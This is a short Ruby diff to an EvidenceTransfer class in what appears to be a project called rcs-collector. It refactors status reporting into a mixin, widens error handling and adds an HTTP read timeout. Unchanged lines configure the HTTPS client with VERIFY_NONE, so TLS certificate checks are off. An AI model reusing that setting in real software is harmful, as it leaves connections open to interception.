@@ -8,6 +8,7 @@ require 'rcs-common/trace'
 require 'rcs-common/fixnum'
 require 'rcs-common/symbolize'
 require 'rcs-common/path_utils'
+require 'rcs-common/systemstatus'
 
 require_release 'rcs-collector/db'
 require_release 'rcs-collector/evidence_manager'
@@ -22,12 +23,10 @@ module Carrier
 class EvidenceTransfer
   include Singleton
   include RCS::Tracer
-
-  attr_accessor :status
+  include SystemStatusMixin
 
   def initialize
     @workers = {}
-    @status = nil
     @http = {}
     @threads = Hash.new
   end
@@ -86,12 +85,12 @@ class EvidenceTransfer
                 end
             end
 
-          rescue PersistentHTTP::Error => e
-            @status = "Cannot reach worker: #{e.message}"
-            trace :error, @status
+          rescue SocketError, PersistentHTTP::Error => e
+            change_status(:error, "Cannot reach worker")
+            trace(:error, "Cannot reach worker: [#{e.class}] #{e.message}")
           rescue Exception => e
-            @status = "Error processing evidences: #{e.class} #{e.message}"
-            trace :error, @status
+            change_status(:error, "Error processing evidence: [#{e.class}] #{e.message}")
+            trace(:error, "Error processing evidence")
           ensure
             trace :debug, "Job for #{instance} is over (#{@threads.keys.size}/#{Thread.list.count} working threads)"
 
@@ -160,6 +159,7 @@ class EvidenceTransfer
       :host         => host,
       :port         => port,
       :use_ssl      => true,
+      :read_timeout => 300,
       :verify_mode  => OpenSSL::SSL::VERIFY_NONE
     )
 
